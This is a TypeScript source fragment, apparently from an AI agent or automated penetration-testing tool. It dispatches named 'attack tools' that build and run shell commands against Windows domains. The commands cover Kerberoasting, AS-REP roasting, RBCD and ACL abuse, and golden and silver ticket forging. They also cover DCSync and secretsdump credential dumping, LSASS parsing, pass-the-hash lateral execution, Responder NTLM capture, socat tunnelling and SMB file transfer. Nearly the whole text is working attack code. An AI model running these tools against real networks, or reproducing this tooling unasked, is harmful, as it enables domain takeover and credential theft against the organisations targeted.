        if (hash) cmd = `impacket-GetUserSPNs '${esc(domain)}/${esc(user ?? '')}' -dc-ip ${esc(dcIp)} ${authStr} -request`;
        if (outputFile) cmd += ` -outputfile ${esc(outputFile)}`;
      } else if (mode === 'asreproast') {
        cmd = `impacket-GetNPUsers '${esc(domain)}/' -dc-ip ${esc(dcIp)} -no-pass`;
        if (userList) cmd += ` -usersfile ${esc(userList)}`;
        if (outputFile) cmd += ` -outputfile ${esc(outputFile)}`;
        cmd += ' -format john';
      } else if (mode === 'get_tgt') {
        cmd = `impacket-getTGT '${esc(domain)}/${esc(user ?? '')}:${esc(password ?? '')}' -dc-ip ${esc(dcIp)}`;
        if (hash) cmd = `impacket-getTGT '${esc(domain)}/${esc(user ?? '')}' -dc-ip ${esc(dcIp)} ${authStr}`;
      } else {
        // get_st
        cmd = `impacket-getST '${esc(domain)}/${esc(user ?? '')}:${esc(password ?? '')}' -dc-ip ${esc(dcIp)}`;
        if (spn) cmd += ` -spn '${esc(spn)}'`;
        if (hash) cmd = `impacket-getST '${esc(domain)}/${esc(user ?? '')}' -dc-ip ${esc(dcIp)} ${authStr} -spn '${esc(spn ?? '')}'`;
      }
      cmd += ' 2>&1';
      return run(cmd, timeout);
    }

    case 'ad_enumerate': {
      const method = input.method as string;
      const domain = input.domain as string | undefined;
      const dcIp = input.dc_ip as string;
      const user = input.user as string | undefined;
      const password = input.password as string | undefined;
      void input.hash; // reserved for future hash-auth support
      const query = input.query as string | undefined;
      const collectionMethod = (input.collection_method as string) ?? 'All';
      const outputFile = input.output_file as string | undefined;

      let cmd: string;

      if (method === 'bloodhound') {
        cmd = `bloodhound-python -d ${esc(domain ?? '')} -u ${esc(user ?? '')} -p '${esc(password ?? '')}' -c ${esc(collectionMethod)} -ns ${esc(dcIp)}`;
        if (outputFile) cmd += ` --zip -o ${esc(outputFile)}`;
        cmd += ' 2>&1';
        return run(cmd, Math.min((input.timeout_sec as number) ?? 300, 300)); // BloodHound cap
      }
      if (method === 'ldapsearch') {
        const bindStr = user && password
          ? `-D '${esc(user)}@${esc(domain ?? '')}' -w '${esc(password)}'`
          : '-x';
        const baseDn = domain ? `DC=${domain.split('.').join(',DC=')}` : '';
        const filter = query ?? '(objectClass=user)';
        cmd = `ldapsearch ${bindStr} -H ldap://${esc(dcIp)} -b '${baseDn}' '${esc(filter)}' 2>&1 | head -200`;
      } else if (method === 'rpcclient') {
        const authStr = user && password ? `${esc(user)}%${esc(password)}` : `''%''`;
        const rpcCmd = query ?? 'enumdomusers';
        cmd = `rpcclient -U '${authStr}' ${esc(dcIp)} -c '${esc(rpcCmd)}' 2>&1`;
      } else if (method === 'smbclient') {
        const authStr = user && password ? `${esc(user)}%${esc(password)}` : `''%''`;
        cmd = `smbclient -L //${esc(dcIp)} -U '${authStr}' 2>&1`;
      } else if (method === 'smbmap') {
        cmd = `smbmap -H ${esc(dcIp)}`;
        if (user) cmd += ` -u ${esc(user)}`;
        if (password) cmd += ` -p '${esc(password)}'`;
        if (domain) cmd += ` -d ${esc(domain)}`;
        cmd += ' 2>&1';
      } else if (method === 'enum4linux') {
        cmd = `enum4linux -a ${esc(dcIp)} 2>&1 | head -200`;
      } else if (method === 'nbtscan') {
        cmd = `nbtscan ${esc(dcIp)} 2>&1`;
      } else if (method === 'samrdump') {
        const authStr = user && password ? `${esc(domain ?? '')}/${esc(user)}:${esc(password)}` : '';
        cmd = `impacket-samrdump ${authStr}@${esc(dcIp)} 2>&1`;
      } else if (method === 'rpcdump') {
        cmd = `impacket-rpcdump ${esc(dcIp)} 2>&1`;
      } else if (method === 'find_delegation') {
        cmd = `impacket-findDelegation '${esc(domain ?? '')}/${esc(user ?? '')}:${esc(password ?? '')}' -dc-ip ${esc(dcIp)} 2>&1`;
      } else if (method === 'get_computers') {
        cmd = `impacket-GetADComputers '${esc(domain ?? '')}/${esc(user ?? '')}:${esc(password ?? '')}' -dc-ip ${esc(dcIp)} 2>&1`;
      } else {
        return `Unknown ad_enumerate method: ${method}`;
      }
      return run(cmd, timeout);
    }

    case 'ad_attack': {
      const method = input.method as string;
      const domain = input.domain as string;
      const dcIp = input.dc_ip as string;
      const user = input.user as string;
      const password = input.password as string | undefined;
      const hash = input.hash as string | undefined;
      const targetUser = input.target_user as string | undefined;
      const targetComputer = input.target_computer as string | undefined;
      const delegateTo = input.delegate_to as string | undefined;
      const newPassword = input.new_password as string | undefined;

      const authStr = hash ? `-hashes :${esc(hash)}` : '';
      const passStr = password ? `:${esc(password)}` : '';

      let cmd: string;
      if (method === 'rbcd') {
        cmd = `impacket-rbcd '${esc(domain)}/${esc(user)}${passStr}' -dc-ip ${esc(dcIp)} ${authStr} -delegate-from '${esc(targetComputer ?? '')}' -delegate-to '${esc(delegateTo ?? '')}' -action write 2>&1`;
      } else if (method === 'dacledit') {
        cmd = `impacket-dacledit '${esc(domain)}/${esc(user)}${passStr}' -dc-ip ${esc(dcIp)} ${authStr} -target '${esc(targetUser ?? '')}' -action read 2>&1`;
      } else if (method === 'add_computer') {
        const compPass = newPassword ?? 'Computer1!';
        cmd = `impacket-addcomputer '${esc(domain)}/${esc(user)}${passStr}' -dc-ip ${esc(dcIp)} ${authStr} -computer-name 'WRAITH$' -computer-pass '${esc(compPass)}' 2>&1`;
      } else if (method === 'change_password') {
        cmd = `impacket-changepasswd '${esc(domain)}/${esc(targetUser ?? '')}' -dc-ip ${esc(dcIp)} -newpass '${esc(newPassword ?? '')}' -altuser '${esc(user)}' -altpass '${esc(password ?? '')}' 2>&1`;
      } else if (method === 'get_laps') {
        cmd = `impacket-GetLAPSPassword '${esc(domain)}/${esc(user)}${passStr}' -dc-ip ${esc(dcIp)} ${authStr} -computer '${esc(targetComputer ?? '')}' 2>&1`;
      } else {
        return `Unknown ad_attack method: ${method}`;
      }
      return run(cmd, (input.timeout_sec as number) ?? 60);
    }

    case 'ticket_forge': {
      const mode = input.mode as string;
      const domain = input.domain as string | undefined;
      const domainSid = input.domain_sid as string | undefined;
      const krbtgtHash = input.krbtgt_hash as string | undefined;
      const serviceHash = input.service_hash as string | undefined;
      const spn = input.spn as string | undefined;
      const user = (input.user as string) ?? 'administrator';
      const userId = (input.user_id as number) ?? 500;
      const ticketFile = input.ticket_file as string | undefined;
      const outputFormat = (input.output_format as string) ?? 'ccache';

      let cmd: string;
      if (mode === 'golden') {
        cmd = `impacket-ticketer -nthash ${esc(krbtgtHash ?? '')} -domain-sid ${esc(domainSid ?? '')} -domain ${esc(domain ?? '')} -user-id ${userId} ${esc(user)} 2>&1`;
      } else if (mode === 'silver') {
        cmd = `impacket-ticketer -nthash ${esc(serviceHash ?? '')} -domain-sid ${esc(domainSid ?? '')} -domain ${esc(domain ?? '')} -spn '${esc(spn ?? '')}' -user-id ${userId} ${esc(user)} 2>&1`;
      } else if (mode === 'convert') {
        cmd = `impacket-ticketConverter ${esc(ticketFile ?? '')} ${esc(ticketFile ?? '').replace(/\.[^.]+$/, '')}.${outputFormat} 2>&1`;
      } else if (mode === 'describe') {
        cmd = `impacket-describeTicket ${esc(ticketFile ?? '')} 2>&1`;
      } else {
        return `Unknown ticket_forge mode: ${mode}`;
      }
      return run(cmd, (input.timeout_sec as number) ?? 30);
    }

    // ── 5. LATERAL MOVEMENT & POST-EXPLOITATION ───────────────────────────

    case 'lateral_exec': {
      const method = input.method as string;
      const target = input.target as string;
      const domain = (input.domain as string) ?? '.';
      const user = input.user as string;
      const password = input.password as string | undefined;
      const hash = input.hash as string | undefined;
      const command = (input.command as string) ?? 'whoami';

      const authStr = hash ? `-hashes :${esc(hash)}` : '';
      const passStr = password ? `:${esc(password)}` : '';

      let cmd: string;
      if (method === 'winrm') {
        if (hash) {
          cmd = `evil-winrm -i ${esc(target)} -u ${esc(user)} -H ${esc(hash)} -c '${esc(command)}' 2>&1`;
        } else {
          cmd = `evil-winrm -i ${esc(target)} -u ${esc(user)} -p '${esc(password ?? '')}' -c '${esc(command)}' 2>&1`;
        }
      } else if (method === 'psexec') {
        cmd = `impacket-psexec '${esc(domain)}/${esc(user)}${passStr}@${esc(target)}' ${authStr} '${esc(command)}' 2>&1`;
      } else if (method === 'wmiexec') {
        cmd = `impacket-wmiexec '${esc(domain)}/${esc(user)}${passStr}@${esc(target)}' ${authStr} '${esc(command)}' 2>&1`;
      } else if (method === 'smbexec') {
        cmd = `impacket-smbexec '${esc(domain)}/${esc(user)}${passStr}@${esc(target)}' ${authStr} 2>&1`;
      } else if (method === 'atexec') {
        cmd = `impacket-atexec '${esc(domain)}/${esc(user)}${passStr}@${esc(target)}' ${authStr} '${esc(command)}' 2>&1`;
      } else if (method === 'dcomexec') {
        cmd = `impacket-dcomexec '${esc(domain)}/${esc(user)}${passStr}@${esc(target)}' ${authStr} '${esc(command)}' 2>&1`;
      } else {
        return `Unknown lateral_exec method: ${method}`;
      }
      return run(cmd, (input.timeout_sec as number) ?? 60);
    }

    case 'domain_dump': {
      const method = (input.method as string) ?? 'dcsync';
      const target = input.target as string | undefined;
      const domain = input.domain as string | undefined;
      const user = input.user as string | undefined;
      const password = input.password as string | undefined;
      const hash = input.hash as string | undefined;
      const outputFile = input.output_file as string | undefined;
      const dumpFile = input.dump_file as string | undefined;
      const justDcUser = input.just_dc_user as string | undefined;

      if (method === 'lsass_parse') {
        return run(`pypykatz lsa minidump ${esc(dumpFile ?? '')} 2>&1`, timeout);
      }

      // secretsdump for dcsync/sam/ntds
      const authStr = hash ? `-hashes :${esc(hash)}` : '';
      const passStr = password ? `:${esc(password)}` : '';
      let cmd = `impacket-secretsdump '${esc(domain ?? '.')}/${esc(user ?? '')}${passStr}@${esc(target ?? '')}'`;
      if (hash) cmd = `impacket-secretsdump '${esc(domain ?? '.')}/${esc(user ?? '')}'@${esc(target ?? '')} ${authStr}`;
      if (method === 'dcsync') {
        cmd += ' -just-dc';
        if (justDcUser) cmd += ` -just-dc-user '${esc(justDcUser)}'`;
      }
      if (outputFile) cmd += ` -outputfile ${esc(outputFile)}`;
      cmd += ' 2>&1';
      return run(cmd, timeout);
    }

    case 'rdp_connect': {
      const target = input.target as string;
      const user = input.user as string;
      const password = input.password as string | undefined;
      const hash = input.hash as string | undefined;
      const domain = input.domain as string | undefined;
      const authOnly = input.auth_only as boolean ?? true;

      let cmd: string;
      if (authOnly) {
        cmd = `xfreerdp /v:${esc(target)} /u:${esc(user)}`;
        if (password) cmd += ` /p:'${esc(password)}'`;
        if (hash) cmd += ` /pth:${esc(hash)}`;
        if (domain) cmd += ` /d:${esc(domain)}`;
        cmd += ' +auth-only /cert:ignore 2>&1';
      } else {
        // Use impacket-rdp_check for quick auth test
        cmd = `impacket-rdp_check '${esc(domain ?? '.')}/${esc(user)}:${esc(password ?? '')}'@${esc(target)} 2>&1`;
      }
      return run(cmd, (input.timeout_sec as number) ?? 30);
    }

    case 'tunnel_proxy': {
      const mode = input.mode as string;
      const listenPort = input.listen_port as number | undefined;
      const targetHost = input.target_host as string | undefined;
      const targetPort = input.target_port as number | undefined;
      const proxyCommand = input.proxy_command as string | undefined;

      let cmd: string;
      if (mode === 'socks_listen') {
        // Start a SOCKS proxy listener
        cmd = `socat TCP-LISTEN:${listenPort ?? 1080},reuseaddr,fork SOCKS4A:localhost:0.0.0.0:0,socksport=${listenPort ?? 1080} 2>&1 &`;
        return run(cmd, 5);
      }
      if (mode === 'port_forward') {
        cmd = `socat TCP-LISTEN:${listenPort ?? 8888},reuseaddr,fork TCP:${esc(targetHost ?? '')}:${targetPort ?? 80} 2>&1 &`;
        return run(cmd, 5);
      }
      if (mode === 'proxy_exec' && proxyCommand) {
        // Execute a command through proxychains
        cmd = `proxychains4 -q ${proxyCommand} 2>&1`;
        return run(cmd, timeout);
      }
      return `Unknown tunnel_proxy mode: ${mode}. Use "socks_listen", "port_forward", or "proxy_exec" with proxy_command.`;
    }

    // ── 6. NETWORK CAPTURE & SMB ──────────────────────────────────────────

    case 'ntlm_capture': {
      const iface = input.interface as string;
      const options = (input.options as string) ?? '-wrf --lm';
      const outputDir = input.output_dir as string | undefined;

      let cmd = `responder -I ${esc(iface)} ${options}`;
      if (outputDir) cmd += ` -w -f -d ${esc(outputDir)}`;
      cmd += ' 2>&1';
      // Responder runs as a long process; use timeout to cap it
      return run(cmd, (input.timeout_sec as number) ?? 300);
    }

    case 'smb_enum': {
      const target = input.target as string;
      const user = (input.user as string) ?? '';
      const password = (input.password as string) ?? '';
      const hash = input.hash as string | undefined;
      const domain = input.domain as string | undefined;
      const action = (input.action as string) ?? 'list_shares';
      const share = input.share as string | undefined;
      const path = input.path as string | undefined;
      const localFile = input.local_file as string | undefined;
      const tool = (input.tool as string) ?? 'smbclient';

      if (tool === 'smbmap') {
        let cmd = `smbmap -H ${esc(target)}`;
        if (user) cmd += ` -u ${esc(user)}`;
        if (password) cmd += ` -p '${esc(password)}'`;
        if (hash) cmd += ` --pass-hash ${esc(hash)}`;
        if (domain) cmd += ` -d ${esc(domain)}`;
        if (share) cmd += ` -s ${esc(share)}`;
        if (action === 'list_files' && share) cmd += ' -R';
        cmd += ' 2>&1';
        return run(cmd, (input.timeout_sec as number) ?? 30);
      }

      if (tool === 'impacket') {
        const authStr = hash ? `-hashes :${esc(hash)}` : '';
        const passStr = password ? `:${esc(password)}` : '';
        const cmd = `impacket-smbclient '${esc(domain ?? '.')}/${esc(user)}${passStr}@${esc(target)}' ${authStr} 2>&1`;
        return run(cmd, (input.timeout_sec as number) ?? 30);
      }

      // Default: smbclient
      const authStr = `'${esc(user)}%${esc(password)}'`;
      if (action === 'list_shares') {
        return run(`smbclient -L //${esc(target)} -U ${authStr} 2>&1`, (input.timeout_sec as number) ?? 30);
      }
      if (action === 'list_files' && share) {
        return run(`smbclient //${esc(target)}/${esc(share)} -U ${authStr} -c 'ls ${esc(path ?? '')}' 2>&1`, (input.timeout_sec as number) ?? 30);
      }
      if (action === 'download' && share && path) {
        return run(`smbclient //${esc(target)}/${esc(share)} -U ${authStr} -c 'get ${esc(path)} ${esc(localFile ?? path)}' 2>&1`, (input.timeout_sec as number) ?? 30);
      }
      if (action === 'upload' && share && localFile) {
        return run(`smbclient //${esc(target)}/${esc(share)} -U ${authStr} -c 'put ${esc(localFile)} ${esc(path ?? localFile)}' 2>&1`, (input.timeout_sec as number) ?? 30);
      }
      if (action === 'enum_perms') {
        return run(`smbmap -H ${esc(target)} -u ${esc(user)} -p '${esc(password)}' 2>&1`, (input.timeout_sec as number) ?? 30);
      }
      return `Unknown smb_enum action: ${action}`;
    }

    default:
      return `Unknown attack tool: ${name}`;
  }
}
